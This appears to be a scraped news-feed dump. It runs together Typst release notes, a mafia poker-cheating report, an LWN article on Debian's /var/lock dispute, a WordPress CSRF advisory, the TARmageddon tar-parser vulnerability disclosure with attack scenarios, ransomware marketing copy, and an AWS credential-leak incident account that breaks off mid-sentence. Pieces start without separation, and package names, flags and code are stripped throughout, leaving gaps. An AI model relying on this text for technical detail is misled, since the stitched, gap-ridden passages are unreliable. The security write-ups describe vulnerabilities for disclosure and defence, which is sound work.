Typst now supports PDF as a native image format. What I personally find most exciting about it, is that PDF images are supported across all export targets, and for each export target in the most suitable format. In PDF export, PDFs are naturally directly embedded. Meanwhile, in HTML and SVG export, PDFs are converted to an embedded SVG on-the-fly. And, finally, in PNG export and the web app preview, PDFs are rasterized. All of this PDF processing functionality lives right in the Typst compiler, with no system dependencies. This is only possible thanks to the amazing work of community member @LaurenzV, who created a new PDF processing library called  from scratch. The library is 100% written in the programming language Rust (which is also the language we use for the Typst compiler) and is thus highly portable.Character-level justificationProducing a visually balanced paragraph was once a fine art, when professional typesetters still carefully set paragraphs with movable type. Nowadays, you could hope that optimal paragraph typesetting is a solved problem across all our software. But, alas, it is not!There are different strategies we can employ to produce a well-justified paragraph. Of course, to justify the paragraph, we need to stretch each line to the width of the measure. There are different ways to do this: Most obviously, we can adjust the spacing between words. This is what most software does. But we can also adjust the spacing between characters. This is now implemented in Typst.Other methods to do this (which we want to explore in the future) include stretching the width of characters (this is best done with ) or, for some scripts, inserting special textual elements. For example, in Arabic, there are  which allow spacing out glyphs in words by extending the connectors between individual glyphs.But that's just part of the recipe. Arguably, the even more crucial part is how this interplays with  we chose to insert. Naively, we can choose our break points based on how much text fits and then perform the stretching. But we can do much better by taking into account each line's potential for stretching with the various mechanisms discussed above! We can then choose the break points that minimize the amount of bad-looking stretching.I was initially skeptical about supporting character-level justification because I've seen it done poorly in some books. But that's actually not the fault of character-level justification per se; it's just excessive use of it. Tastefully chosen maxima—together with an algorithm that minimizes displeasing typography—make it bring out the best in justification.We hear a lot about microtypography when people compare Typst with LaTeX. And even though Typst uses the same fundamental algorithm as LaTeX does to optimize paragraphs, it's true that LaTeX has some extra tricks up its sleeve. Now we do too though, as character-level justification is a feature that LaTeX does  support.In Typst 0.13, we shipped a first, highly experimental version of HTML export. This very minimal version already introduced the primitives for flexible HTML generation. With these primitives, the mapping of Typst elements to HTML can be expressed through show rules, just like the mapping to visual elements is performed in paged export.What was lacking though were show rules for many built-in elements, including elements like footnotes, outlines, and citations. Typst 0.14 makes good progress in this regard. Most semantic elements (those from the  category) are now properly mapped to semantic HTML. We've also improved handling of textual content in HTML export. The more visualization- and styling-focused parts of Typst's standard library remain largely unsupported, but we plan to add support for those (to the extent possible) in the future.Below, you can see an example of a small, but non-trivial Typst document exported to HTML with Typst 0.14.numbering
In , let's cite .

Another exciting addition to HTML export is the new typed HTML interface. Typst's  module now includes functions for constructing HTML elements with strongly-typed attributes. This means you can now write
  autoplay
  width
  height
  src attrs
  autoplay
  width
  height
  srcAs you can see, attributes are mapped to idiomatic Typst-native types.Last but not least, we're happy to announce that HTML export will soon come to the Typst web app. We're still polishing up the implementation, but plan to ship it in the coming weeks.Please note that HTML export remains experimental. To enable it in the CLI, pass  or set . In the web app, support for HTML export will also need to be enabled on a per-project basis.As far as breaking changes and deprecations go, this is a pretty calm release. Most documents should continue to work as before. There are a few minor breaking changes that make certain validations more strict. For instance, labels, link URLs, and font lists may not be empty anymore. To learn about all breaking changes, consult the changelog and search for "breaking change".The release also contains a few deprecations. In particular, you'll need to replace any use of  with . Moreover, two bibliography styles were renamed and the  CLI flag was deprecated in favor of the new, more flexible  flag with . There are also a few deprecated symbols. The compiler will warn you about all use of deprecated functionality.With this release, we're also bringing a better version upgrade experience to the web app. Previously, projects would always use the latest compiler version unless explicitly pinned to a specific version in the settings side panel.We are now phasing out the "Latest" option.

They were "fishes" allegedly being targeted by the mafia in an elaborate poker gambling scheme that included X-ray card tables, secret cameras, analysers in chip trays and sunglasses and contact lenses that could read their hand. In what sounds like an Ocean's Eleven film plot, prosecutors say these "unwitting" victims were cheated out of at least $7m (£5.25m) in poker games - with one person losing at least $1.8m.The scheme, which US prosecutors described as "reminiscent of a Hollywood movie", was dismantled in a sprawling federal investigation that led to more than 30 arrests, including members of La Cosa Nostra crime families, Portland Trail Blazers basketball coach Chauncey Billups and former National Basketball Association (NBA) player Damon Jones. FBI director Kash Patel called it a "mind-boggling" fraud scheme that cheated victims in New York, Miami, Las Vegas and other US cities. Arrests in the scheme were announced on Thursday along with those in an alleged basketball betting plot, in which professional NBA players are accused of faking injuries to influence betting odds. The underground poker scheme started as early as 2019, prosecutors say, and was allegedly operated by the mafia - specifically by members of notorious crime families, including Bonnano, Gambino, Lucchese and Genovese. A cut of the profits, prosecutors say, helped fund their criminal enterprise. Former professional athletes, described by prosecutors as "face cards", were enlisted to help in the scheme and entice victims into playing. Lured in by the opportunity to play with a high-profile celebrity - such as Billups or Jones - a wealthy, "unwitting victim" would be recruited for illegal, underground poker games where tens of thousands of dollars were on the line, prosecutors allege. Unbeknownst to the lured-in players - referred to in the scheme as a "fish" - everyone surrounding them was in on the elaborate scam - from the players to the dealers, even the technology used to shuffle the deck and count the chips, according to a lengthy federal indictment. Sophisticated wireless technology was also used to deceive the players during the games, most commonly in Texas Hold 'Em.The technology was everywhere - an X-ray table that read any face-down card, analysers inside chip trays, a rigged shuffling machine that read cards and predicted who would have the best hand, and pre-marked cards that allowed those wearing special sunglasses and contact lenses to read what was in everyone's hands. Secretive cameras - built into tables and light fixtures - also helped convey information to those helping in the plot, authorities say. Then there was also a sophisticated method of communicating and rigging the game, prosecutors allege. Information from the game would be sent to an off-site conspirator - called an "operator" by prosecutors - who then would send information to another player sitting at the table who was in on the scheme - who prosecutors call a "quarterback" or "driver". That person would then secretly signal to others, prosecutors allege, effectively stealing money and making it impossible for victims to win. Texts from the US justice department's evidence suggest the "quarterback" would either touch the $1,000 poker chip, tap his chin, wrist or arm to signal which conspirator had the best hand. If the victim had the best hand, the "quarterback" would touch his black chips.The texts also appear to show that at times conspirators agreed to lose some hands in order to keep victims at the gambling table for longer.Another series of texts suggests participants in the scheme avoided suspicion of cheating by swapping in players and losing money to co-conspirators.Authorities estimate that each game would leave a victim out of tens or hundreds of thousands of dollars.Prosecutors say the defendants allegedly laundered the funds from the scheme through cryptocurrency, cash exchanges and shell companies. A cut of the profits went to those who helped in the plot, prosecutors say, and some allegedly went to fund the mafia's criminal enterprise. "This alleged scheme wreaked havoc across the nation, exploiting the notoriety of some and the wallets of others to finance the Italian crime families," said FBI Assistant Director in Charge Christopher Raia.Billups, who was accused of being a face card in the fixed card games, was arrested in Portland and was placed on leave by the NBA. The Portland Trail Blazers said in a statement that they were aware of the allegations involving their head coach and were "fully co-operating with the investigation".Billups' attorney, Chris Heywood, told US media on Thursday that the Hall of Famer is a "man of integrity" and would fight the allegations.Jones was arrested in relation to both the poker and NBA injuries scheme. He is charged with two counts each of wire fraud conspiracy and money laundering conspiracy.]]></content:encoded></item><item><title>Microsoft Issues Emergency Patch for Critical WSUS Remote Code Execution Flaw (CVE-2025-59287)</title><link>https://thecyberexpress.com/microsoft-fixes-cve-2025-59287/</link><author></author><category>security</category><pubDate>Fri, 24 Oct 2025 11:36:33 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Microsoft Issues Emergency Patch for Critical WSUS Remote Code Execution Flaw (CVE-2025-59287)]]></content:encoded></item><item><title>Mesh2Motion – Open-source web application to animate 3D models</title><link>https://mesh2motion.org/</link><author>Splizard</author><category>dev</category><pubDate>Fri, 24 Oct 2025 11:01:23 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[ is a FREE & open-source web application to animate your 3D models.

We can admit it, marketing is not our strong suit. Our strength is
writing the kind of articles that developers, administrators, and
free-software supporters depend on to know what is going on in the
Linux world. Please subscribe today to help us keep doing that, and so
we don’t have to get good at marketing.

           By October 13, 2025Debian packagers have a great deal of latitude when it comes to the
configuration of the software they package; they may opt, for example,
to disable default
features in software that they feel are a security
hazard. However, packagers are expected to ensure that their packages
comply with Debian Policy,
regardless of the upstream's preferences. If a packager fails to
comply with the policy, the Debian Technical
Committee (TC) can step in to override them, which it has
done in the case of a recent systemd change that broke several
programs that depend on a world-writable 
directory.The Filesystem Hierarchy Standard (FHS) specifies
that the  directory should be used to store lock
files for devices and other resources shared by multiple
applications. On Debian,  is a symbolic link to
. The  directory is created as a tmpfs
filesystem specifically for run-time files by 
during system startup.Debian Policy still cites the FHS, even though the FHS
has gone unmaintained for more than a decade. The specification was
not so much finished as abandoned
after FHS 3.0 was released—though there is a slow-moving
effort to revive and revise the standard as FHS 4.0, it has not
yet produced any results. Meanwhile, in the absence of a current
standard, systemd has spun off its 
documentation to the Linux Userspace
API (UAPI) Group as a specification. LWN
covered that
development in August, related to Fedora's search for an FHS
successor.The  directory was deprecated in Systemd v258;
rather than dropping the directory entirely, though, the project has
changed the default to making  writable only by root, which is stricter than the permissions Debian had shipped with previously
. The plan is to
get rid of  entirely in the v259 release, though
users (or distributions) can still retain the legacy behavior by
adding a configuration file in  to override
systemd's defaults and create the directory with the desired
permissions.The Debian project just released a new stable version, Debian 13
("trixie"), in August, and work has begun on Debian 14
("forky"). The current stable version of Debian shipped with systemd
v257, so users on stable will not be affected by these changes. But
v258 has entered Debian unstable where the change to
 broke other software, such as the Unix-to-Unix Copy
program (UUCP) and the 
utility. Use of the directory is not limited to vintage utilities;
Zbigniew Jędrzejewski-Szmek objected
to removing  in v259 as it would break 
and create additional work for distributions:
Doing this would this way just creat a foottrap for distributions: if
they notice the change, they'll just create a local override, so we
get a more complicated system in total with zero benefit to anyone. If
they miss it, things will be broken for a while until users report
it. And then they'll add the override.
On August 13, Marco d'Itri—who is listed as a maintainer
of the systemd package—filed a bug
against the  package reporting that systemd v258-rc1-1
had broken , along
with filing a 
bug
against the systemd package, which cited the FHS entry for
. He said that a compromise might be to make the
directory writable by the dialout
group rather than world-writable. He also mentioned
that there was a previous
effort in 2014 to modernize software that uses UUCP-style locks to
use 
instead, but it stalled out."Dead and severely outdated"Rather than temporarily reverting the behavior, systemd maintainer Luca
Boccassi argued
that a world-writable directory in  is a security risk.
Any process could write as much as it wanted to , which
could effectively DoS the system by exhausting space or inodes;
filling up  would then cause critical services, such as
udev, to stop
working. The FHS, he said, is "dead and severely outdated".The issue had already been discussed
by the systemd project; Lennart Poettering had responded
that he did not see the point of  "", but distributions were free to do as they see fit:Consider this more a passing of the baton from upstream systemd to
downstreams: if your distro wants this kind of legacy interface, then
just add this via a distro-specific tmpfiles drop-in. But there's no
point really in forcing anyone who has a more forward-looking view of
the world to still carry that dir.Poettering argued that distributions could make their own choices,
though it made him shudder to think of allowing unprivileged programs
to fill up a directory. Boccassi echoed that sentiment in his response
to the Debian systemd bug. Any package could ship a configuration for
 to create the directory and assume responsibility
for it as well:I certainly won't try to stop anyone wishing to do it, but also I
do not wish for these old workarounds to ship in this package
either.There's ~2 years time until Forky ships, and that should be plenty of time
to either add this workaround elsewhere, or fix remaining programs to
use BSD locks, or both, so I'm not going to hold back the new version
from testing for this niche case, sorry.Boccassi closed the bug with the "WONTFIX" tag.On September 1, d'Itri responded
that upstream systemd's opinion was not relevant in this case. Debian
policy requires the directory for lock files of serial devices, though
he had also opened a bug
to revisit that, since the practice of using  for
serial-device locks dates back to the 1980s. However,
 is provided by systemd, so he reasoned that it is a
systemd bug unless another package was identified to take ownership of
creating the directory. "But you cannot just decide that the policy
violation does not exist."Thorsten Alteholz opened a bug
with Debian's Technical Committee on September 15. He asked for
advice on how to proceed since the systemd bug had been marked
WONTFIX.
So what do you recommend how to go on from here? Change Debian policy
(as asked in #1111839), revert the change in systemd, find a Debian
wide solution or let every package maintainer implement their own
solution?
Bdale Garbee weighed
in on the bug as well. He said that he uses  "almost
constantly for interacting with embedded serial consoles on devices a
USB connection away from my laptop". He was frustrated with the
change imposed by systemd "", and looked forward
to the TC's response.On September 24, Matthew Vernon responded
to the bug, with a CC to the systemd maintainer alias. He said that it
seemed that Debian Policy required FHS compliance, "at least until
we come up with a transition plan", and asked if systemd would
please revert the change. There was no response from any of the
systemd maintainers.Vernon updated
the bug on September 29, and said that the TC had discussed the
situation at its last meeting. The conclusion was that systemd should
comply with policy, and thus FHS. He included a draft ballot text that
the TC would vote on, which noted that the committee was
"" to the argument that  would be a
better solution, but that "an important part of the role of a 
Debian Developer is ensuring that software in Debian complies with 
Debian Policy". A final ballot
for the committee to consider was posted on October 2.The ballot contained three options; all three required that the
systemd package provide  "with
relaxed enough permissions that existing Debian software that uses
/var/lock for system-wide locks of serial devices (and similar
purposes) works again". The committee would exercise its power
under the Debian Constitution to override the systemd maintainers.
The options were:1) This change to systemd must persist until a satisfactory migration
of impacted software has occurred and Policy updated accordingly.2) This change to systemd must persist until Policy has been updated
to allow otherwise.3) This change to systemd must persist until the TC allows otherwise,
which the TC expects to do once a suitable transition plan has been
agreed.Vernon replied
on October 6 to say that a decision had been reached and that
option one had won.Debian's continued use of UUCP-style locking does seem to be more
than a little bit dated. The FHS 3.0 is clearly reaching the end
of its useful life, if not actually expired.As a comparison, Fedora's 
package has a patch
to use 
instead. The upcoming Fedora 43 release includes systemd v258,
and  is not world-writable. It seems like 
Debian could borrow Fedora's approach
for the  package, though that would not solve the problem
for any other Debian packages affected by the 
change. There is also third-party software to consider, of course.To date, Boccassi has not responded to the conversation; I emailed
d'Itri to ask why he did not make the change himself, since he was
aware of the bug. He replied on October 13 and said that 
"a maintainer cannot force a decision on another maintainer."
Since he and Boccassi disagreed about the change it was left to the TC
to decide. He said that he planned to prepare a merge request to
implement the TC's decision, "as I have already agreed with
Luca", within the week.]]></content:encoded></item><item><title>3,000 YouTube Videos Exposed as Malware Traps in Massive Ghost Network Operation</title><link>https://thehackernews.com/2025/10/3000-youtube-videos-exposed-as-malware.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhh8EaTq-s91jlucVVZYpqJYdk5xQXEy0ylAf-poP2YIxboYThJyShnGQwhh-OORfMy6LnRQlwQfzHP2bf8Ao0JyihddLTI6G4fcLdnxktdgM8vE_02iM1LFvJCgmafz56dDvXjyDLXMWkE8-RxezA8kCpkn4heiMnIZT7pZp72rQXIa00u9YAJadnsKxUm/s1600/youtube.jpg" length="" type=""/><pubDate>Fri, 24 Oct 2025 10:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A malicious network of YouTube accounts has been observed publishing and promoting videos that lead to malware downloads, essentially abusing the popularity and trust associated with the video hosting platform for propagating malicious payloads.

The IndieAuth plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 4.5.4. This is due to missing nonce verification on the `login_form_indieauth()` function and the authorization endpoint at wp-login.php?action=indieauth. This makes it possible for unauthenticated attackers to force authenticated users to approve OAuth authorization requests for attacker-controlled applications via a forged request granted they can trick a user into performing an action such as clicking on a link or visiting a malicious page while logged in. The attacker can then exchange the stolen authorization code for an access token, effectively taking over the victim's account with the granted scopes (create, update, delete).

Due to the widespread nature of  in various forms, it is not possible to truly quantify upfront the blast radius of this bug across the ecosystem.Our suggested remediation is to immediately upgrade to one of the patched versions or remove this dependency. If you depend on , consider migrating to an actively maintained fork like . In addition, the Edera fork  will be archived to coalesce all efforts with the astral fork and reduce the ecosystem confusion.The Challenge of Abandonware: A Decentralized Responsible DisclosureThis vulnerability disclosure was uniquely challenging because the most popular fork (, with over 5 million downloads on crates.io) appears to be abandonware – no longer actively maintained.In a standard disclosure, a single patch is applied to the main upstream repository, and all downstream users inherit the fix. Because we could not rely on the original project maintainers to apply the fix, we were forced to coordinate a decentralized disclosure across a deep and complex fork lineage: (Root) ➡️  (Most popular fork, abandoned) ➡️ (Originally maintained by Edera, now archived) ➡️ (Actively maintained by Astral)Instead of a single point of contact, we had to:Develop patches for the upstream versions.Identify and reach out to the maintainers of the unmaintained upstream repositories ( and ). Neither project had a SECURITY.md or public contact method, so it required some social engineering and community sleuthing to locate the right maintainers. Individually contact the maintainers of the two most active forks ( and ) and coordinate simultaneous patching under a strict 60-day embargo.Proactively reach out to major downstream projects (including , , , and ) to ensure they were ready to upgrade immediately upon disclosure.This process required significantly more effort and time than a typical disclosure, underscoring the severe challenges and inefficiency of ensuring wide-scale patching when critical vulnerabilities are found in popular, yet abandoned, open-source dependencies.Downstream Project Coordination ResultsBinstalk: Plan to eliminate dependency or switch to patched  due to small attack surface.Opa-wasm: Not affected, as they do not use the vulnerable unpacking/extraction-to-path functionality.Other projects were made aware of the upcoming patch and have not responded to our attempts at outreach. Furthermore, there are likely several downstream projects relying on impacted versions that we are not aware of. Technical Overview & Analysis This vulnerability is a desynchronization flaw that allows an attacker to "smuggle" additional archive entries into TAR extractions. It occurs when processing nested TAR files that exhibit a specific mismatch between their PAX extended headers and ustar headers.The flaw stems from the parser's inconsistent logic when determining file data boundaries:A file entry has both PAX and ustar headers.The PAX header correctly specifies the actual file size (, e.g., 1MB).The ustar header incorrectly specifies zero size ().The vulnerable  parser incorrectly advances the stream position based on the ustar size (0 bytes) instead of the PAX size (X bytes).By advancing 0 bytes, the parser fails to skip over the actual file data (which is a nested TAR archive) and immediately encounters the next valid TAR header located at the start of the nested archive. It then incorrectly interprets the inner archive's headers as legitimate entries belonging to the outer archive.File overwriting attacks within extraction directories.Supply chain attacks via build system and package manager exploitation.Bill-of-materials (BOM) bypass for security scanning.Vulnerable Processing (PAX size=X, ustar size=0):The result seen by the parser: Actually extracted by tokio-tar:
The key insight is that the parser's internal position in the stream becomes misaligned, causing it to treat headers and data from a hidden, nested archive as part of the primary archive's entry list.1. Python Build Backend HijackingTarget: Python package managers using  (e.g., ). An attacker uploads a malicious package to PyPI. The package's outer TAR contains a legitimate , but the hidden inner TAR contains a malicious one that hijacks the build backend. During package installation, the malicious config overwrites the legitimate one, leading to RCE on developer machines and CI systems.2. Container Image PoisoningTarget: Container testing frameworks (e.g., ). Testing frameworks that extract image layers for analysis can be tricked into processing layers crafted with this nested TAR structure. The hidden inner TAR introduces unexpected or overwritten files, allowing for test environment compromise and supply chain pollution.Target: Any system with separate "scan/approve" vs "extract/deploy" phases. A security scanner analyzes the outer, clean TAR and approves its limited file set. However, the extraction process using the vulnerable library pulls in additional, unapproved, and unscanned files from the inner TAR, resulting in a security control bypass and policy violation.The Edera team provided patches for  (used by uv) and . The vulnerability is tracked as CVE-2025-62518. Huge thank you to the security team at Astral for diligently working with us to patch this vulnerability and responsibly disclose. The patch requires modifying the TAR parser to:Prioritize PAX headers for size determination over ustar headers.Validate header consistency between PAX and ustar records.Implement strict boundary checking to prevent data/header confusion.Due to architectural differences, we did not provide a direct patch for  but a patch was written by the maintainer.If immediate patching or switching to a maintained fork is not possible, consider these workarounds:: The standard tar crate (non-async) correctly handles this scenario and can serve as a temporary replacement:: Mature, well-tested, handles PAX headers correctly: Synchronous API only, may require architectural changes for async codebases: Consider wrapping tar operations in tokio::task::spawn_blocking() for async compatibilityValidate extracted file counts against expected manifestsImplement post-extraction directory scanning to detect unexpected filesUse separate extraction sandboxes with file count/size limitsDisable file overwriting during extraction where possible. A Note on Rust, Security Boundaries, and the Path ForwardThe discovery of TARmageddon is an important reminder that Rust is not a silver bullet. While Rust's guarantees make it significantly harder to introduce memory safety bugs (like buffer overflows or use-after-free), it does not eliminate logic bugs—and this parsing inconsistency is fundamentally a logic flaw. Developers must remain vigilant against all classes of vulnerabilities, regardless of the language used.This lineage of vulnerable libraries ( ➡️  ➡️ forks) tells a common open-source story: popular code, even in modern secure languages, can become unmaintained and expose its millions of downstream users to risk.This experience reinforces the importance of defense-in-depth. We are happy to report that due to proactive design in Edera, our own products were not vulnerable to this bug despite embedding the vulnerable . By implementing strong security boundaries and ensuring that vulnerable operations were not used in critical pathways, Edera mitigated the issue before the patch was even released.Lastly, we’d like to thank the researchers and maintainers across the ecosystem that worked with us to responsibly disclose and patch this vulnerability. Timeline – 60 Day Disclosure Embargo 8/21: Initial investigation found the vulnerability in  and , as well as the upstream  and 8/21: Minimal reproduction created8/22: Created patches for all libraries8/22: Disclosed bug to maintainers of all libraries, the rust foundation, and select downstream projects (selected by number of downloads).

It is growing in both scale and sophistication, making comprehensive, modern threat intelligence increasingly necessary for the prevention of ransomware attacks.Modern threat intelligence solutions—which use customized, contextualized, and entity-centric threat profiling to identify which threats are most likely to target your specific organization next—offer a proactive solution to these next-generation ransomware attacks.Proactive threat intelligence helps prevent ransomware attacks in a multitude of ways, separating signal from noise and automating detection and response by:
            Providing AI reporting that enables automatic generation of customized, audience-specific ransomware intelligence reportsIdentifying exposed credentials across the dark web and triggering automated remediation workflowsPrioritizing and remediating the common ports and protocols targeted by ransomware actors to proactively fortify potential entry pointsDelivering an end-to-end view of your ransomware exposure across the attack lifecycle as well as guidance for each threat to identify security risks early, prioritize action, and take targeted mitigation steps.Integrating into existing workflows and security tools to enable efficient, intelligence-driven detection and response to ransomware threats across a variety of areas and aspects of an organization and its operations.To successfully integrate proactive threat intelligence into your organization’s security operations, take a three-pronged approach that focuses on people, processes, and technology.With the continued evolution of AI and ML, modern threat intelligence is only growing more sophisticated and capable by the day—leading to more intelligent automation, better detection of “weak signals”, reduced false positives, and more entity and organization-specific intelligence that automatically separates signal from noise for actionable insights.Introduction: The Rise of Next-Generation RansomwareThe face of ransomware is changing. In both scale and sophistication, this long-standing feature of the threat landscape has evolved from an occasional nuisance into one of the most devastating threats facing organizations today.Attackers and the tactics they employ have evolved dramatically. The emergence of double and triple extortion, ransomware-as-a-service, and AI-assisted campaigns have come together to both lower the barrier to entry for attackers and make modern ransomware attacks more sophisticated and impactful. This was recently evidenced in Verizon’s 2025 Data Breach Investigations Report (DBIR), which found that ransomware was present in nearly half (44%) of all breaches in the past 12 months, up from just 32% the year prior. And as for the changing tactics, a recent study from Sophos revealed that exploited vulnerabilities now account for nearly a third (32%) of all ransomware incidents today, surpassing phishing for the first time as the leading technical root cause behind these attacks.the face of ransomware continues to change and evolve, traditional defenses, such as backups, patching, and endpoint detection, are no longer enough. Though they remain necessary, they are no longer up to the task of defending against today’s ransomware landscape on their own. Attackers move too quickly, exploit vulnerabilities too efficiently, and adapt too rapidly. To truly shift the balance, organizations must pivot from a reactive stance to a proactive one. That’s the promise of modern threat intelligence.A Look at Best of Breed Threat Intelligence: What Sets it Apart, and Why That MattersAt its core, modern, proactive threat intelligence is about getting ahead of attacks before they materialize. By leveraging advanced analytics, AI, and ML, proactive threat intelligence works to forecast emerging threats and adversary behavior. By continuously sourcing information and analyzing patterns across the open, deep, and dark web—alongside analyst research findings and entity-centric intelligence—modern threat intelligence reveals early indicators of targeting, exploitation,, and vulnerabilities with contextual specificity to a given organization.This proactive capability allows security teams to anticipate and prioritize risks based on likelihood and impact, enabling proactive detection, faster mitigation, and more strategic resource allocation.Threat intelligence, has traditionally, been largely reactive. It often compiles indicators of compromise (IOCs) after an attack has already occurred, aggregating things like past attacker TTPs to help detect or respond to threats that have already emerged. To make the flip from reactive to proactive, today’s advanced threat intelligence applies machine learning, trend analysis, and adversary modeling to anticipate an attacker’s intent to target an organization and capability to carry out a successful attack, based on past behavior, which vulnerabilities are most likely to be exploited (e.g. weak points in one’s attack surface, exposed credentials, etc.), which ransomware operators are active in your industry, and what attack vectors will likely be leveraged next. This kind of intelligence can then be arranged into a customized threat map, which helps organizations prioritize their defensive efforts intelligently and effectively.]]></content:encoded></item><item><title>MyVidster2025 - myvidster.com</title><link>https://haveibeenpwned.com/PwnedWebsites#MyVidster2025</link><author></author><category>databreach</category><pubDate>Fri, 24 Oct 2025 00:00:00 +0000</pubDate><source url="https://cybermonit.com/leaks">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-58429 - AutomationDirect Productivity Suite Relative Path Traversal</title><link>https://cvefeed.io/vuln/detail/CVE-2025-58429</link><author></author><category>vulns</category><pubDate>Thu, 23 Oct 2025 23:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-58429

So when it happened to , it was a wake-up call - not because I made a silly mistake, but because it showed how  and  these attacks can be.“It won’t happen to me.”“I’m not that interesting.”“What could anyone even do with my account?”But it  happen. And it  happen - eventually.Security isn’t something that magically happens after the fact. It has to be . Especially if you’re freelancing or experimenting on your own cloud - this time, it’s  pocket on the line, not a big company’s budget write-off.I was lucky: I detected the attack fast, reacted immediately, and contained it. Still - it was stressful, messy, and humbling.This incident really made me think — and only grew my appetite to tackle the hard problems the security industry (still) faces.In the next sections, I’ll walk you through:The attack from my point of view - what I saw, what I thought, what I did.The attacker’s likely flow and intent (as reconstructed from the traces).And finally, what I did next to trace them back and strengthen my defenses.2-3 hours before realizingWe had just wrapped up our daily scrum. The management team stayed on for a quick chat about next-quarter goals.My inbox began to explode with . Not the usual junk - this was a flood: newsletters in random languages, sign-ups for services I’d never heard of, confirmation emails from dozens of companies.Within an hour, I had over , not counting what my spam filters had already caught.At first, I thought,  I skimmed through them absentmindedly while staying in the conversation. Luckily, I didn’t just bulk-delete everything - something felt off. So I opened each one, checking the sender names and subjects, trying to make sense of it.What’s the goal here?Is someone pranking me?Why would anyone do this?It didn’t make sense yet. But it would - a few hours later, when I connected the dots.The spam flood didn’t stop. Every few minutes, another dozen emails - confirmations, newsletters, random subscriptions in every possible language.Then, buried in the noise, one message caught my eye:AWS emails me all the time - invoices, alerts, confirmations. But this one felt… odd.“Wait, I didn’t create an Organization. Or… did I?”It’s important to know that around that time, I was actively building a website (shhh). I’d been deep in AWS for days - creating resources, testing configurations, deploying updates. So an email like that didn’t seem out of place.My brain went: It’s probably something I triggered earlier. I’ll check it later. That’s fine.You know what? Let’s make sure. I even asked ChatGPT, “This looks fine, right?” He also said, So, I clicked the link. 🫣(Why did the attacker do it? Patience - I’ll explain soon.)A few more hours passed. The spam storm slowed down but didn’t stop - a steady drizzle of strange subscriptions still hitting my inbox.And then, this email arrived:I froze. “This is not a coincidence anymore,” I thought.I switched into .Of course, before panicking, I did what every modern tech person does - I asked ChatGPT. And it confidently replied: “That’s normal! Don’t worry - AWS rotates DKIM codes sometimes.” So I almost relaxed.But then I saw something odd:AWS_SES_DKIM_PENDING_TO_VERIFY.“Pending to verify?” Why pending? I knew I hadn’t created or changed anything related to SES.That’s when it clicked - I opened CloudTrail and filtered events in the Ireland region. There it was: the DKIM setup event, created by an IAM user named .I never created such a user.That was the moment I knew for sure - (And yes - I’ll explain later what is SES and why the attacker did all this.)First 1-2 hours - understanding the severityAt this point, one thing was clear: it didn’t matter  the attacker got in, or who they were, or what they wanted.First priority: contain the situation and secure my account.I quickly realized the attacker had touched my . I went straight to  and .My email was still the  - I could log in via Cognito, MFA and all.I immediately .The management account is my account! We can breathe. This means that the Organisation belongs to my account, the attacker didn’t overtake the OrganizationThe dates are literally “now” - it happened now, not by me.The dummy account is not mine, the email is not mine and it’s already closed - which means that this just “dummy account”Next step - remove attacker access.I opened the : four new IAM users had been created.I deleted all of them, along with all AWS keys I had for programmatic access.At this point, I still didn’t know how the attacker got in - but better safe than sorry.I didn’t know this at this point, not now - our attacker doesn’t have access to my account anymore!Next, I had to face the unpleasant truth: .My personal account had been blown up - 400%+ increase in spending. Naturally, this wasn’t fun. 😅EC2 usage - surprising, because I normally run .Filtering by region, it was clear: the attacker loved  (I usually stick to us-east-1).I terminated all the attacker’s EC2 instances, deleted their security groups and key pairs. I also removed the rogue DKIM records they had set up.Re-checked IAM resources and SSH keys.Turned off my new website temporarily. I instructed a customer I manage to change their email passwords.Rotated all keys for  and .By the end of this first response, I was feeling .The attacker’s access was gone. The immediate threat was contained. The account was back under my control.Hour 3 - Incident analysisI contacted AWS - and they responded surprisingly fast.The first thing they wanted to confirm was that I still had access to the management account. Once I told them I had performed an initial incident response, they relaxed a bit and put my account into an  state. That mode restricts a lot of actions until AWS believes the account is safe - useful, but I didn’t stop there.I continued my own analysis.Step 1 - inventory everythingI used  to generate a full inventory of resources across the account. At a glance I didn’t see any unknown resources - a good sign, but not definitive.Step 2 - build a timeline from CloudTrailI went region-by-region and exported  to CSV for each region, then merged them into a single large CSV filtered by time. That let me replay every action, in order - exactly what you want in an IR.Root cause (what I found)The timeline made the root cause clear. On , the attacker used a programmatic AWS access key associated with my account to perform a sequence of actions:Created multiple IAM users to establish a backdoor.Launched EC2 instances (the likely source of the cost spike).Created an  and spun up a new account (which they later closed).Kicked off Resource Explorer indexing to map what else they could access.In short: the attacker operated with programmatic credentials already tied to my account (those are the keys I later deleted), and used them to set up persistence and run workloads.Below I’ll lay out the  (step-by-step) including the attacker’s likely intent.Hour 4 - finding the breachNow comes the embarrassing part - let’s get it over with.🤦‍♂️As I mentioned, I’d been working on my website (shhhh…). I made a product decision to implement the React UI with SSR (Server Side Rendering). That means the pages aren’t static - they’re hydrated from the server.(Hydration = rendered on the backend as much as possible; for example, reacting to screen dimensions is impossible server-side, but fetching APIs works.)The reason I chose SSR was performance: faster page loads make the site more attractive to search engine bots. I used  for this.Because it’s SSR, APIs can live in the same server codebase, and in fact, NextJS fully supports this:“They must pack the API JS code to be served on the server as one js file, and the react components as a different js file”. Makes sense right? This is basic security control…Except - I didn’t realize all my backend code was exposed to the UI. Yup, all of it.Later, I integrated  for artifact storage and added an AWS key - in the code.“I’ll move to secret manager right after I implement this important feature”Fast forward - one day later, I got hacked.Check the next section for what I could have done differently - spoiler: plenty of options.But for now, let’s : what was the attacker doing? Step by step, we’ll go through their actions and intentions.Summary - Chronological attack flowI suspect the attacker started by crawling the internet, searching for secrets via regex or AI classification.My domain and website were relatively new, so it’s likely he scanned newly created websites for easy targets.Oct 12th, Evening - Attack BeginsThe attacker decides to strike. He creates a new IAM user and assigns it admin access, detaching it from my own user as quickly as possible.Then he waits six hours - for two reasons:If his user creation triggers security tools, he doesn’t want to reveal his hand.He waits for , when I’m likely offline.After the wait, he launches a , along with a KeyPair and his own Security Group to allow SSH access. Sadly, because I didn’t want to pay for EC2, I deleted the instance before thinking to snapshot it. So I’ll never know exactly what he planned - 